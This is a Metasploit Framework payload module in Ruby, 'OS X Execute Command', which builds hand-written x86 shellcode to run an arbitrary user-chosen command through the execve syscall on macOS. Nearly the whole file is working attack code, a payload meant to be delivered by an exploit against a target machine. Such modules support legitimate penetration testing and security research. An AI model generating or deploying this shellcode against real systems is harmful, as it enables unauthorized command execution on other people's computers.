##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Osx

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OS X Execute Command',
			'Description'   => 'Execute an arbitrary command',
			'Author'        => [ 'snagg <snagg[at]openssl.it>', 'argp <argp[at]census-labs.com>' ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86))

		# Register exec options
		register_options(
			[
				OptString.new('CMD',  [ true,  "The command string to execute" ]),
			], self.class)
	end

	#
	# Dynamically builds the exec payload based on the user's options.
	#
	def generate_stage
		cmd     = datastore['CMD'] || ''
		len     = cmd.length + 1
		payload =
			"\x31\xc0\x50" +
			Rex::Arch::X86.call(len) + cmd +
			"\x00\x5e\x89\xe7\xb9" + Rex::Arch::X86.pack_word(len) +
			"\x00\x00\xfc\xf2\xa4\x89\xe3\x50" +
			"\x50\x53\xb0\x3b\x50\xcd\x80"

	end

end
